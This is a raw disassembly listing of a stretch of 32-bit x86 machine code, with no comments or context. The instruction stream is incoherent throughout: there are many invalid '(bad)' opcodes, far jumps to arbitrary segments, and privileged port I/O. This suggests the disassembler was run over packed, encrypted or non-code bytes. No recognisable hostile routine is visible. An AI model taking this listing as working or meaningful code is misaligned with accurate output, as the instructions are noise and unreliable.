  41d7b9:	adc    dl,ah
  41d7bb:	adc    DWORD PTR [ebx],ebp
  41d7bd:	loope  0x41d810
  41d7bf:	and    bh,bl
  41d7c1:	jmp    0xb75cfe3b
  41d7c6:	or     DWORD PTR [esi-0x64],ebp
  41d7c9:	retf   0x1267
  41d7cc:	pop    es
  41d7cd:	arpl   cx,sp
  41d7cf:	cwde   
  41d7d0:	add    BYTE PTR [edi+0x4f72a94f],al
  41d7d6:	(bad)  
  41d7d7:	cmp    ch,bh
  41d7d9:	inc    eax
  41d7da:	int3   
  41d7db:	(bad)  
  41d7dc:	push   ecx
  41d7dd:	test   al,0xdb
  41d7df:	clc    
  41d7e0:	pop    ecx
  41d7e1:	and    DWORD PTR [edi],0xffffffb1
  41d7e4:	lahf   
  41d7e5:	xor    ebp,esi
  41d7e7:	xchg   esi,ebp
  41d7e9:	mov    al,ah
  41d7eb:	jns    0x9542aa85
  41d7f1:	scas   eax,DWORD PTR es:[edi]
  41d7f2:	add    ah,dh
  41d7f4:	fcomip st,st(1)
  41d7f6:	(bad)  [eax+ebx*2+0x3098993]
  41d7fd:	dec    esi
  41d7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7ff:	or     bh,cl
  41d801:	fdiv   QWORD PTR [edi-0x51d37eb3]
  41d807:	add    al,0xe6
  41d809:	dec    ebx
  41d80a:	jne    0x41d7e0
  41d80c:	mov    WORD PTR [eax],gs
  41d80e:	imul   ebp,DWORD PTR [ebp*1+0x44f56269],0xafd7d5f5
  41d819:	xchg   esp,eax
  41d81a:	jp     0x41d83b
  41d81c:	mov    dh,0x5b
  41d81e:	int    0xd0
  41d820:	adc    DWORD PTR [eax-0x7a],esp
  41d823:	pop    esp
  41d824:	out    dx,eax
  41d825:	mov    DWORD PTR [edi+edx*4-0x1d7f31b4],edx
  41d82c:	push   edi
  41d82d:	inc    ebp
  41d82e:	in     eax,dx
  41d82f:	jl     0x41d806
  41d831:	pop    edx
  41d832:	lea    esi,[esi+edi*4+0x4536ffe3]
  41d839:	pusha  
  41d83a:	push   ebp
  41d83b:	pop    ecx
  41d83c:	push   eax
  41d83d:	jmp    0x69cd9fcf
  41d842:	push   ebp
  41d843:	and    ebp,DWORD PTR [edx+0x34]
  41d846:	push   ebp
  41d847:	sahf   
  41d848:	inc    ebp
  41d849:	xor    eax,0x86565fca
  41d84e:	fcmovnu st,st(3)
  41d850:	jno    0x41d8b0
  41d852:	(bad)  
  41d854:	mov    eax,ds:0xd8054f9b
  41d859:	pop    edx
  41d85a:	pop    esi
  41d85b:	aas    
  41d85c:	aad    0x9a
  41d85e:	clc    
  41d85f:	lds    esp,FWORD PTR [ecx-0x2e018ee8]
  41d865:	sbb    bl,bl
  41d867:	imul   ebx,DWORD PTR [edi-0x78],0x694786d8
  41d86e:	mov    bh,0xd1
  41d870:	inc    ebp
  41d871:	sub    eax,0xc0b4ef37
  41d876:	fld    QWORD PTR [ecx+0x7b826dfb]
  41d87c:	in     al,0x3e
  41d87e:	lds    ecx,FWORD PTR [edi]
  41d880:	or     eax,0xeebcece8
  41d885:	cmp    ebx,ebp
  41d887:	jl     0x41d853
  41d889:	aas    
  41d88a:	nop
  41d88b:	ficomp DWORD PTR [esp+edx*1+0x6cabbfcf]
  41d892:	cmp    bh,bl
  41d894:	fisubr DWORD PTR [esi+0x29c1622f]
  41d89a:	sbb    al,0x57
  41d89c:	test   BYTE PTR [eax],cl
  41d89e:	sbb    dl,cl
  41d8a0:	nop
  41d8a1:	cwde   
  41d8a2:	fdivr  DWORD PTR [edx+0x74]
  41d8a5:	scas   eax,DWORD PTR es:[edi]
  41d8a6:	or     eax,0xe8549f93
  41d8ab:	pop    edx
  41d8ac:	adc    bh,BYTE PTR [esi+0x74]
  41d8af:	fist   DWORD PTR [eax+0x2c]
  41d8b2:	inc    eax
  41d8b3:	push   ebx
  41d8b4:	lahf   
  41d8b5:	in     eax,dx
  41d8b6:	mov    bx,0x8250
  41d8ba:	push   esp
  41d8bb:	inc    ecx
  41d8bc:	rcl    DWORD PTR [ebx+0x4c044787],1
  41d8c2:	imul   DWORD PTR [ecx]
  41d8c4:	inc    edx
  41d8c5:	mov    ds:0x7c36bd2a,eax
  41d8ca:	(bad)  
  41d8cb:	or     bl,BYTE PTR [esi+0x181b1791]
  41d8d1:	xor    eax,0xa50421f4
  41d8d6:	clc    
  41d8d7:	fadd   st,st(6)
  41d8d9:	test   BYTE PTR [eax-0x49],cl
  41d8dc:	das    
  41d8dd:	or     bl,0x1f
  41d8e0:	mov    edi,0xa718389d
  41d8e5:	aaa    
  41d8e6:	push   esp
  41d8e7:	mov    ecx,edx
  41d8e9:	loop   0x41d929
  41d8eb:	mov    dl,0xf6
  41d8ed:	sahf   
  41d8ee:	aad    0x25
  41d8f0:	inc    eax
  41d8f1:	xor    eax,DWORD PTR [edi]
  41d8f3:	mov    ch,0x4e
  41d8f5:	jmp    0x687e2817
  41d8fa:	daa    
  41d8fb:	xchg   BYTE PTR [edi],ah
  41d8fd:	cwde   
  41d8fe:	outs   dx,BYTE PTR ds:[esi]
  41d8ff:	pushf  
  41d900:	mov    ch,0x53
  41d902:	xor    edi,edx
  41d904:	fs das 
  41d906:	in     eax,0x78
  41d908:	ret    
  41d909:	jecxz  0x41d97d
  41d90b:	aaa    
  41d90c:	lahf   
  41d90d:	and    bh,BYTE PTR [esi-0x11ff5927]
  41d913:	sbb    ecx,ebx
  41d915:	clc    
  41d916:	sbb    WORD PTR [edx+0x67],ax
  41d91a:	and    eax,0x3cd685d
  41d91f:	data16 (bad) 
  41d921:	mov    edx,0xc366c3d8
  41d926:	cli    
  41d927:	jmp    0x41d979
  41d929:	and    al,0xf8
  41d92b:	pop    ebx
  41d92c:	jmp    0x41d8b4
  41d92e:	int    0x51
  41d930:	mov    ebp,0x45ba122a
  41d935:	sbb    bl,dl
  41d937:	add    al,0xe7
  41d939:	mov    bh,0x3
  41d93b:	addr16 out dx,eax
  41d93d:	jo     0x41d982
  41d93f:	inc    ecx
  41d940:	fwait
  41d941:	xlat   BYTE PTR ds:[ebx]
  41d942:	mov    al,ds:0xd2262d23
  41d947:	ja     0x41d98d
  41d949:	or     bh,al
  41d94b:	fcomp  DWORD PTR [eax]
  41d94d:	pop    eax
  41d94e:	ret    
  41d94f:	stc    
  41d950:	push   cs
  41d951:	and    eax,0x689c88ab
  41d956:	and    eax,0x51845b80
  41d95b:	push   ecx
  41d95c:	mov    edx,0x401ae3b8
  41d961:	cmc    
  41d962:	mov    dl,0xcb
  41d964:	loope  0x41d9e1
  41d966:	jmp    0xab12eb0
  41d96b:	aas    
  41d96c:	inc    ebx
  41d96d:	out    0x68,eax
  41d96f:	jae    0x41d984
  41d971:	int3   
  41d972:	mov    WORD PTR ds:0x35fe0919,es
  41d978:	sbb    ebx,edi
  41d97a:	push   ebp
  41d97b:	pop    ecx
  41d97c:	sahf   
  41d97d:	js     0x41d9e5
  41d97f:	inc    ecx
  41d980:	pop    ss
  41d981:	xor    dx,WORD PTR [ebx]
  41d984:	inc    esi
  41d985:	xchg   BYTE PTR [esi],dh
  41d987:	inc    edx
  41d988:	nop
  41d989:	push   ecx
  41d98a:	in     al,dx
  41d98b:	or     al,dh
  41d98d:	sbb    al,0x14
  41d98f:	mov    al,0x83
  41d991:	ret    0x7614
  41d994:	jl     0x41d953
  41d996:	pop    es
  41d997:	ins    DWORD PTR es:[edi],dx
  41d998:	inc    ebx
  41d999:	push   eax
  41d99a:	scas   al,BYTE PTR es:[edi]
  41d99b:	sbb    DWORD PTR [edx+0x42b848bf],edi
  41d9a1:	or     dl,0xe6
  41d9a4:	test   BYTE PTR [edx-0x787c77c5],dh
  41d9aa:	retf   
  41d9ab:	fistp  QWORD PTR [ecx]
  41d9ad:	jg     0x41d9ee
  41d9af:	pop    esi
  41d9b0:	(bad)  
  41d9b1:	out    0x8f,al
  41d9b3:	retf   
  41d9b4:	inc    eax
  41d9b5:	xor    bl,BYTE PTR [ecx]
  41d9b7:	pushf  
  41d9b8:	sbb    BYTE PTR [ebp-0x3ce764b5],dl
  41d9be:	jge    0x41d96d
  41d9c0:	or     DWORD PTR [edi-0x29ce9d04],esi
  41d9c6:	hlt    
  41d9c7:	loopne 0x41d9c7
  41d9c9:	xor    BYTE PTR [ecx],bl
  41d9cb:	mov    eax,0xe2991680
  41d9d0:	pop    edx
  41d9d1:	dec    esi
  41d9d2:	pop    edi
  41d9d3:	xor    eax,0xe20ed9df
  41d9d8:	pushf  
  41d9d9:	mov    edx,0x1bed7dd8
  41d9de:	ret    0xe84
  41d9e1:	ds xor esp,esi
  41d9e4:	fisttp WORD PTR [ebp-0x782f70b7]
  41d9ea:	sub    DWORD PTR [ebp+0x65e1c8d5],0xffffffee
  41d9f1:	push   ebx
  41d9f2:	jns    0x41da45
  41d9f4:	cmp    DWORD PTR [eax+0x7064d95c],edx
  41d9fa:	call   0x3c6d1a29
  41d9ff:	jl     0x41da55
  41da01:	push   ecx
  41da02:	lods   al,BYTE PTR ds:[esi]
  41da03:	xchg   BYTE PTR [edx],ah
  41da05:	mov    bh,BYTE PTR [eax]
  41da07:	or     bl,ah
  41da09:	inc    edx
  41da0a:	pop    es
  41da0b:	mov    ebp,ebp
  41da0d:	push   edx
  41da0e:	imul   esp,eax,0xffffffa5
  41da11:	mov    al,ds:0x3e916d61
  41da16:	dec    ecx
  41da17:	xor    DWORD PTR [edx+0x4864efce],ebx
  41da1d:	add    BYTE PTR [ecx],al
  41da1f:	ja     0x41da9c
  41da21:	cli    
  41da22:	rol    DWORD PTR [edi-0x13],1
  41da25:	dec    esp
  41da26:	iret   
  41da27:	lea    ecx,[eax+0x70c9c754]
  41da2d:	inc    edi
  41da2e:	or     bh,dh
  41da30:	daa    
  41da31:	mov    DWORD PTR [eax-0x7e8c685f],ebx
  41da37:	or     BYTE PTR [esi],bl
  41da39:	sub    bh,BYTE PTR [ebx]
  41da3b:	cdq    
  41da3c:	ja     0x41daa4
  41da3e:	fild   QWORD PTR [esi+0x1f]
  41da41:	fldcw  WORD PTR [ebp-0x715e54a8]
  41da47:	push   0xfffffff1
  41da49:	and    eax,0x22da40ef
  41da4e:	out    dx,eax
  41da4f:	les    edx,FWORD PTR [ebx+0xa36954]
  41da55:	loop   0x41da48
  41da57:	inc    esi
  41da58:	add    edi,DWORD PTR [ebp+0x4a]
  41da5b:	dec    edi
  41da5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da5d:	adc    BYTE PTR [eiz*2+0x7b24bca7],dh
  41da64:	mov    edi,ecx
  41da66:	add    DWORD PTR [edx],esp
  41da68:	xlat   BYTE PTR ds:[ebx]
  41da69:	js     0x41dad8
  41da6b:	fsub   st(3),st
  41da6d:	push   ebx
  41da6e:	loopne 0x41da65
  41da70:	mov    WORD PTR [esi],?
  41da72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da73:	xchg   edx,eax
  41da74:	push   0x12
  41da76:	inc    ebx
  41da77:	rol    BYTE PTR [edi+ebx*1],0x25
  41da7b:	sub    eax,0x40ec1b2a
  41da80:	adc    dl,ch
  41da82:	(bad)  
  41da83:	and    dh,BYTE PTR [esi-0x6a3727eb]
  41da89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8a:	(bad)  
  41da8c:	shr    DWORD PTR [ecx],0x10
  41da8f:	jmp    0xc4ae89b0
  41da94:	mov    eax,DWORD PTR [esi+edi*8-0x6a161636]
  41da9b:	push   esi
  41da9c:	xchg   esp,eax
  41da9d:	in     eax,dx
  41da9e:	mov    esp,0xa9f74ee4
  41daa3:	cmc    
  41daa4:	retf   0x1896
  41daa7:	dec    eax
  41daa8:	or     al,BYTE PTR [esi]
  41daaa:	xor    eax,0x4c7e128d
  41daaf:	call   0x8d9a:0xaed2f1cf
  41dab6:	jmp    0xd225:0x5b18bb33
  41dabd:	popf   
  41dabe:	cmp    al,0xb
  41dac0:	push   0x43
  41dac2:	dec    esi
  41dac3:	sub    al,0x2c
  41dac5:	mov    edi,0x60da401c
  41daca:	xchg   ebp,eax
  41dacb:	js     0x41daaf
  41dacd:	in     al,dx
  41dace:	cdq    
  41dacf:	and    eax,0x740a7662
  41dad4:	fistp  QWORD PTR [edx+0x1]
  41dad7:	jmp    0x41da7a
  41dad9:	mov    BYTE PTR [edx+eiz*8],cl
  41dadc:	bound  esp,QWORD PTR [eax]
  41dade:	pop    ds
  41dadf:	add    DWORD PTR [edi+0x40],esi
  41dae2:	mov    WORD PTR [edx+0x3fc5799b],ds
  41dae8:	or     eax,0xe5cde312
  41daed:	and    eax,0x5504814d
  41daf2:	sub    eax,DWORD PTR [edi-0x3a]
  41daf5:	xchg   ebp,eax
  41daf6:	dec    edi
  41daf7:	push   0x2e
  41daf9:	hlt    
  41dafa:	cmp    eax,0xc9d3cb0b
  41daff:	fs pop ss
  41db01:	sbb    eax,0x4195be81
  41db06:	sub    ebp,DWORD PTR [ebx-0x5b]
  41db09:	neg    BYTE PTR [esp-0x9]
  41db0d:	cmp    al,0x39
  41db0f:	je     0x41dafb
  41db11:	sbb    eax,0xbcbb381e
  41db16:	fsub   DWORD PTR [esi-0x2676cb4d]
  41db1c:	and    DWORD PTR [esi-0x1f],0x4a
  41db20:	mov    ds:0xd7b25a8a,al
  41db25:	repz push edi
  41db27:	mov    cl,0x86
  41db29:	mov    eax,0x7f1acc6a
  41db2e:	add    al,0xff
  41db30:	jmp    0xe672:0xd44270d5
  41db37:	loopne 0x41dabe
  41db39:	out    dx,eax
  41db3a:	xlat   BYTE PTR ds:[ebx]
  41db3b:	aam    0x20
  41db3d:	std    
  41db3e:	xchg   ecx,eax
  41db3f:	aas    
  41db40:	sbb    eax,0x310a02a2
  41db45:	pop    ds
  41db46:	fwait
  41db47:	add    eax,0xd56a04fe
  41db4c:	daa    
  41db4d:	and    al,0xa4
  41db4f:	(bad)  
  41db50:	les    esp,FWORD PTR [edx+0x6]
  41db53:	xor    DWORD PTR [esi+0x1bd3ac82],ebp
  41db59:	aam    0x5d
  41db5b:	ret    
  41db5c:	pop    ss
  41db5d:	fdivr  QWORD PTR [edx+0x7fb7980a]
  41db63:	jecxz  0x41db0a
  41db65:	jne    0x41dbd5
  41db67:	aaa    
  41db68:	sub    al,0xc8
  41db6a:	shr    bh,1
  41db6c:	ss pop esp
  41db6e:	outs   dx,DWORD PTR ds:[esi]
  41db6f:	popf   
  41db70:	mov    eax,0x6665ad05
  41db75:	xchg   ebp,eax
  41db76:	sbb    bh,BYTE PTR [esi+0x2]
  41db79:	shr    bl,0xc
  41db7c:	shl    cl,0x4f
  41db7f:	mov    eax,0xab0a607a
  41db84:	adc    ch,BYTE PTR [esi-0x416db745]
  41db8a:	lock xor al,0x2f
  41db8d:	(bad)  
  41db8e:	push   ss
  41db8f:	add    esp,DWORD PTR [edx]
  41db91:	push   ecx
  41db92:	xor    DWORD PTR [edi+0x5a7023c],esi
  41db98:	pop    esi
  41db99:	ins    BYTE PTR es:[edi],dx
  41db9a:	push   esi
  41db9b:	sti    
  41db9c:	shl    BYTE PTR [edx],0x26
  41db9f:	lds    ebp,FWORD PTR [ecx]
  41dba1:	adc    DWORD PTR [ebx+0xb3dab87],0x3ecd521
  41dbab:	pop    edx
  41dbac:	fidivr WORD PTR [ebp+0x76]
  41dbaf:	mov    al,0xb1
  41dbb1:	je     0x41dbf0
  41dbb3:	or     edx,DWORD PTR [esi+0x4bf8a46a]
  41dbb9:	loop   0x41db59
  41dbbb:	rcr    BYTE PTR [ebx-0x2],cl
  41dbbe:	or     edx,DWORD PTR [ecx+edi*4+0xf]
  41dbc2:	dec    esi
  41dbc3:	xor    BYTE PTR [edi-0x77],cl
  41dbc6:	add    BYTE PTR [ebp+ecx*4-0x449eecb],bl
  41dbcd:	add    eax,0xfbe90a4a
  41dbd2:	pushf  
  41dbd3:	retf   
  41dbd4:	out    0x35,eax
  41dbd6:	mov    eax,0x1ba5c19b
  41dbdb:	jle    0x41db98
  41dbdd:	std    
  41dbde:	lahf   
  41dbdf:	aam    0x9a
  41dbe1:	mov    eax,DWORD PTR [edi]
  41dbe3:	jbe    0x41dc26
  41dbe5:	pop    ebx
  41dbe6:	fstp   st(6)
  41dbe8:	inc    ecx
  41dbe9:	dec    esp
  41dbea:	outs   dx,DWORD PTR ds:[esi]
  41dbeb:	fadd   QWORD PTR ds:0x70fcaafc
  41dbf1:	push   0xffffff8d
  41dbf3:	nop
  41dbf4:	aam    0x96
  41dbf6:	pusha  
  41dbf7:	in     al,0xbb
  41dbf9:	and    BYTE PTR [edx+0x4532d4f9],ah
  41dbff:	out    0xbc,eax
  41dc01:	push   0x68
  41dc03:	(bad)  
  41dc04:	shl    edx,1
  41dc06:	sbb    BYTE PTR [ecx+0xc],0x99
  41dc0a:	in     al,0xe0
  41dc0c:	push   0x4413e1b8
  41dc11:	das    
  41dc12:	pop    edx
  41dc13:	inc    esp
  41dc14:	aad    0x24
  41dc16:	lock sar esi,1
  41dc19:	aas    
  41dc1a:	sub    ebx,esi
  41dc1c:	into   
  41dc1d:	add    DWORD PTR [ecx+0x7e055433],ecx
  41dc23:	xchg   edx,eax
  41dc24:	stos   BYTE PTR es:[edi],al
  41dc25:	dec    ebp
  41dc26:	jb     0x41dc08
  41dc28:	inc    esi
  41dc29:	shl    BYTE PTR [ecx],1
  41dc2b:	inc    edx
  41dc2c:	gs xchg bh,ch
  41dc2f:	cmp    eax,0xc6cef3e6
  41dc34:	loope  0x41dbf7
  41dc36:	int3   
  41dc37:	mov    ds:0x1a426fc5,al
  41dc3c:	and    DWORD PTR [ebx],eax
  41dc3e:	and    BYTE PTR [ebx+0x26],ah
  41dc41:	fs int 0xb7
  41dc44:	cmp    al,BYTE PTR [edi]
  41dc46:	inc    ecx
  41dc47:	sbb    al,0xa5
  41dc49:	push   ebp
  41dc4a:	dec    edi
  41dc4b:	leave  
  41dc4c:	ret    
  41dc4d:	retf   0x8d89
  41dc50:	(bad)  
  41dc51:	mov    ah,0x3b
  41dc53:	and    al,0x53
  41dc55:	xchg   ecx,eax
  41dc56:	out    0x7,eax
  41dc58:	xchg   esp,eax
  41dc59:	fild   WORD PTR [eax+0x42]
  41dc5c:	popa   
  41dc5d:	out    0xa1,al
  41dc5f:	jp     0x41dc38
  41dc61:	lds    ebp,FWORD PTR [edx+0x21]
  41dc64:	mov    cl,dl
  41dc66:	and    ebx,DWORD PTR [eax+0x55bed4ef]
  41dc6c:	cmc    
  41dc6d:	or     al,0xa4
  41dc6f:	sbb    eax,DWORD PTR [edi-0x6f]
  41dc72:	cs dec edi
  41dc74:	adc    dh,BYTE PTR ds:0x7fcf594
  41dc7a:	push   ebx
  41dc7b:	js     0x41dc88
  41dc7d:	addr16 das 
  41dc7f:	ret    
  41dc80:	mov    ebx,0x86eb827c
  41dc85:	jmp    DWORD PTR [ecx-0x75]
  41dc89:	sbb    al,0x1e
  41dc8b:	push   esp
  41dc8c:	add    esi,edx
  41dc8e:	sbb    BYTE PTR [edi+0x10],bh
  41dc91:	mov    bh,BYTE PTR [esi-0x33]
  41dc94:	test   al,al
  41dc96:	imul   ecx,DWORD PTR [edi-0xd],0xfffffffa
  41dc9a:	(bad)  
  41dc9b:	jnp    0x41dc7f
  41dc9d:	push   ecx
  41dc9e:	or     DWORD PTR [ebx+0x7c],esi
  41dca1:	push   ss
  41dca2:	pop    ds
  41dca3:	sbb    eax,0xb4a5aafe
  41dca8:	or     DWORD PTR [esp+esi*2-0x530678bc],edi
  41dcaf:	sar    BYTE PTR [esp+eax*8-0x6],0x19
  41dcb4:	xor    dh,0xd4
  41dcb7:	fdecstp 
  41dcb9:	jbe    0x41dcb4
  41dcbb:	sub    edi,esi
  41dcbd:	pop    edx
  41dcbe:	and    edx,ebx
  41dcc0:	and    DWORD PTR [esi+edi*8],ecx
  41dcc3:	inc    edi
  41dcc4:	jno    0x41dcb8
  41dcc6:	adc    DWORD PTR [edi],0xb15dcf7f
  41dccc:	sub    DWORD PTR [eax],esp
  41dcce:	add    eax,0x6d092d07
  41dcd3:	sbb    BYTE PTR [ebp-0x69],cl
  41dcd6:	mov    DWORD PTR [eax-0x16],edx
  41dcd9:	or     al,0xd0
  41dcdb:	ja     0x41dc99
  41dcdd:	inc    eax
  41dcde:	shl    DWORD PTR [edx-0x2ffe6c15],1
  41dce4:	or     dh,cl
  41dce6:	cdq    
  41dce7:	popa   
  41dce8:	xchg   DWORD PTR [ecx+0x7d3dea78],ecx
  41dcee:	ds out 0xff,al
  41dcf1:	test   dl,dl
  41dcf3:	loopne 0x41dcf5
  41dcf5:	fisubr WORD PTR [ebp-0xf]
  41dcf8:	scas   al,BYTE PTR es:[edi]
  41dcf9:	mov    ecx,0xbcfc94c3
  41dcfe:	js     0x41dd47
  41dd00:	pop    es
  41dd01:	push   ecx
  41dd02:	jne    0x41dd52
  41dd04:	push   es
  41dd05:	mov    BYTE PTR [edx+0x6cfdfe57],bl
  41dd0b:	mov    ds:0xc0843033,eax
  41dd10:	adc    eax,0x50bdd8bd
  41dd15:	int3   
  41dd16:	pop    ss
  41dd17:	lods   eax,DWORD PTR ds:[esi]
  41dd18:	pcmpeqb mm1,mm6
  41dd1b:	cmc    
  41dd1c:	outs   dx,BYTE PTR ds:[esi]
  41dd1d:	pop    ebp
  41dd1e:	jno    0x41dd02
  41dd20:	lea    esp,[ebx-0x20]
  41dd23:	cwde   
  41dd24:	arpl   cx,cx
  41dd26:	cmp    ch,dl
  41dd28:	das    
  41dd29:	pop    ebp
  41dd2a:	xchg   ebx,eax
  41dd2b:	cmp    edx,DWORD PTR [ecx]
  41dd2d:	jmp    0x41dd68
  41dd2f:	jecxz  0x41dd23
  41dd31:	cmp    al,0x1d
  41dd33:	mov    ecx,0x690d5bf6
  41dd38:	bound  edi,QWORD PTR [edi-0x6071ba4d]
  41dd3e:	xchg   BYTE PTR [ebp-0xf],bl
  41dd41:	dec    esp
  41dd42:	or     DWORD PTR [edi],0x57
  41dd45:	cmp    dh,ah
  41dd47:	xchg   esp,eax
  41dd48:	jbe    0x41dcd7
  41dd4a:	sub    ax,0xbb2
  41dd4e:	pop    esi
  41dd4f:	ja     0x41dd83
  41dd51:	adc    eax,0x9ff759c9
  41dd56:	sbb    ecx,DWORD PTR [ebp-0x15]
  41dd59:	add    cl,BYTE PTR [ecx-0x5d]
  41dd5c:	pop    edi
  41dd5d:	xchg   ebp,eax
  41dd5e:	jle    0x41dce6
  41dd60:	fdivp  st(4),st
  41dd63:	add    cl,BYTE PTR [ecx+edx*2+0x7a]
  41dd67:	imul   ecx,DWORD PTR [ebp-0x39],0xd6fa4f21
  41dd6e:	mov    dl,0x9d
  41dd70:	or     DWORD PTR [edi+0x3a],ecx
  41dd73:	adc    bl,BYTE PTR [eax+ebx*1]
  41dd76:	aas    
  41dd77:	or     DWORD PTR [edx+0x5a],esi
  41dd7a:	pop    es
  41dd7b:	xchg   edx,eax
  41dd7c:	daa    
  41dd7d:	cmc    
  41dd7e:	(bad)  
  41dd7f:	mov    ds:0x7cfd0f71,al
  41dd84:	sub    DWORD PTR [edi+ecx*4],edx
  41dd87:	sub    al,0x0
  41dd89:	loop   0x41ddbc
  41dd8b:	pop    ds
  41dd8c:	(bad)  
  41dd8d:	sbb    esi,ecx
  41dd8f:	push   es
  41dd90:	jge    0x41dd36
  41dd92:	sbb    dl,BYTE PTR [edi-0x696ea7e5]
  41dd98:	mov    edx,DWORD PTR [ebp+edx*1+0x7a412dc]
  41dd9f:	xor    al,BYTE PTR [edx-0x77]
  41dda2:	cmp    al,0x53
  41dda4:	dec    ebx
  41dda5:	(bad)
  41dda8:	jmp    0xe371a72c
  41ddad:	xchg   ebx,eax
  41ddae:	mov    ch,0x2e
  41ddb0:	jns    0x41ddd5
  41ddb2:	push   cs
  41ddb3:	mov    BYTE PTR [eax-0x10f14e18],dl
  41ddb9:	sbb    eax,0xfe59595c
  41ddbe:	and    BYTE PTR [eax-0x75766fae],bl
  41ddc4:	mov    ch,0x8b
  41ddc6:	mov    bl,BYTE PTR [ebx+0x35ebe211]
  41ddcc:	sub    al,0xec
  41ddce:	shl    BYTE PTR [ecx-0x58b0bd9b],1
  41ddd4:	call   0x35ff:0xcdfdcf5e
  41dddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dddc:	mov    DWORD PTR [eax+eiz*1-0x3],eax
  41dde0:	fidiv  WORD PTR ds:0x7ec2d02
  41dde6:	rcl    BYTE PTR [ecx],1
  41dde8:	(bad)  
  41ddea:	hlt    
  41ddeb:	test   eax,0xf4caaf28
  41ddf0:	sahf   
  41ddf1:	or     ebp,DWORD PTR [ebx+0x4c1959a7]
  41ddf7:	inc    esi
  41ddf8:	clc    
  41ddf9:	cli    
  41ddfa:	cli    
  41ddfb:	and    eax,0xef51b4cf
  41de00:	mov    eax,ds:0xd6c0ac2a
  41de05:	mov    bh,0x42
  41de07:	int    0x6
  41de09:	pushf  
  41de0a:	push   edx
  41de0b:	ss jle 0x41ddf8
  41de0e:	dec    esi
  41de0f:	les    ebp,FWORD PTR [edi+0x4476144e]
  41de15:	cdq    
  41de16:	fistp  WORD PTR [esi]
  41de18:	(bad)  
  41de19:	mov    bl,bl
  41de1b:	mov    ch,0xbc
  41de1d:	mov    ah,0xd2
  41de1f:	pop    edi
  41de20:	lahf   
  41de21:	mov    ds:0x219efe1e,al
  41de26:	les    edx,FWORD PTR [esi]
  41de28:	(bad)  
  41de29:	addr16 std 
  41de2b:	pushf  
  41de2c:	ror    DWORD PTR ds:0xeb763e05,0xd5
  41de33:	and    ah,BYTE PTR [eax-0x46]
  41de36:	dec    ebx
  41de37:	mov    eax,0xf72a23fe
  41de3c:	pusha  
  41de3d:	xor    eax,0x837088f1
  41de42:	pop    ds
  41de43:	cmp    al,0x1c
  41de45:	aad    0xa7
  41de47:	test   BYTE PTR [esi-0x336bf9b6],0xe8
  41de4e:	inc    edi
  41de4f:	es xor eax,ecx
  41de52:	lock repz sbb dh,BYTE PTR ds:0x18646a7e
  41de5a:	test   al,0xf3
  41de5c:	push   eax
  41de5d:	inc    edi
  41de5e:	jmp    0x41de8f
  41de60:	xor    al,0x9f
  41de62:	sbb    ah,dl
  41de64:	jo     0x41de3c
  41de66:	addr16 aad 0xa
  41de69:	arpl   WORD PTR [edi+edx*4-0x4b],ax
  41de6d:	or     DWORD PTR [ebp-0x7a],edi
  41de70:	adc    DWORD PTR [esi+0x1a],ebp
  41de73:	div    BYTE PTR [esi+0x151835ac]
  41de79:	arpl   WORD PTR [esi-0x5a088db6],si
  41de7f:	jmp    0x41dea4
  41de81:	jecxz  0x41deae
  41de83:	inc    ecx
  41de84:	call   0xbf6f:0xf8b23fea
  41de8b:	sub    dl,dl
  41de8d:	loopne 0x41dea0
  41de8f:	xor    ebp,DWORD PTR [ebx+0x3c91e380]
  41de95:	sub    bl,dl
  41de97:	cs call 0xc56d7210
  41de9d:	push   cs
  41de9e:	sub    al,0x19
  41dea0:	pop    ds
  41dea1:	xchg   BYTE PTR [esi],ah
  41dea3:	(bad)  
  41dea5:	push   esp
  41dea6:	repnz cmp dl,al
  41dea9:	jne    0x41dec2
  41deab:	jecxz  0x41de99
  41dead:	enter  0xe8f8,0x38
  41deb1:	and    DWORD PTR [ebx-0x42e1a068],ebx
  41deb7:	call   0x494565f0
  41debc:	or     BYTE PTR ss:[ebp+edi*2-0x2a4b9aa2],dh
  41dec4:	jmp    0x7d282bac
  41dec9:	xchg   DWORD PTR [ecx-0xd],edi
  41decc:	pusha  
  41decd:	mov    eax,ds:0x3f675570
  41ded2:	inc    ebp
  41ded3:	imul   edi,DWORD PTR [esp+ecx*8+0x6c53787c],0x41785d0d
  41dede:	dec    esi
  41dedf:	dec    esp
  41dee0:	in     eax,dx
  41dee1:	loop   0x41defe
  41dee3:	push   es
  41dee4:	out    dx,al
  41dee5:	adc    ecx,edx
  41dee7:	repnz mov ecx,0x985fe609
  41deed:	add    ch,ch
  41deef:	mov    dh,0x9
  41def1:	loope  0x41deb0
  41def3:	inc    ebp
  41def4:	scas   eax,DWORD PTR es:[edi]
  41def5:	cmp    al,0xf1
  41def7:	call   0x7996:0x363721b
  41defe:	test   DWORD PTR [ebx],0x73517a65
  41df04:	mov    bh,0xc5
  41df06:	outs   dx,BYTE PTR ds:[esi]
  41df07:	fwait
  41df08:	inc    esi
  41df09:	mov    dh,0xfe
  41df0b:	(bad)  
  41df0c:	shl    DWORD PTR [edx+ebx*4+0x1],1
  41df10:	add    eax,0x54e2ba40
  41df15:	popa   
  41df16:	adc    esp,DWORD PTR [ebx+0x0]
  41df19:	jmp    0x41df2e
  41df1b:	sbb    DWORD PTR [edx+0x37],esi
  41df1e:	call   0x20a3ad66
  41df23:	jne    0x41df3a
  41df25:	adc    al,0xbe
  41df27:	mov    WORD PTR [edx-0x24],ds
  41df2a:	push   cs
  41df2b:	test   BYTE PTR [ebx-0xf],bh
  41df2e:	int    0xc3
  41df30:	mov    ah,0x29
  41df32:	push   cs
  41df33:	pop    ebp
  41df34:	mov    dl,0xcc
  41df36:	pop    ebp
  41df37:	cmp    ch,BYTE PTR [ebx+0x4537540e]
  41df3d:	pop    ebp
  41df3e:	lds    ebx,FWORD PTR [ebp+esi*8+0x6a]
  41df42:	cmp    DWORD PTR [edi+0x5d0c0907],0xffffff90
  41df49:	push   0xffffff97
  41df4b:	xor    al,0x6e
  41df4d:	sub    BYTE PTR [ebx-0x6a3d5da3],al
  41df53:	push   esp
  41df54:	(bad)  
  41df55:	cdq    
  41df56:	cmc    
  41df57:	loope  0x41df22
  41df59:	les    esi,FWORD PTR [esi]
  41df5b:	pop    ebp
  41df5c:	stos   DWORD PTR es:[edi],eax
  41df5d:	jle    0x41df49
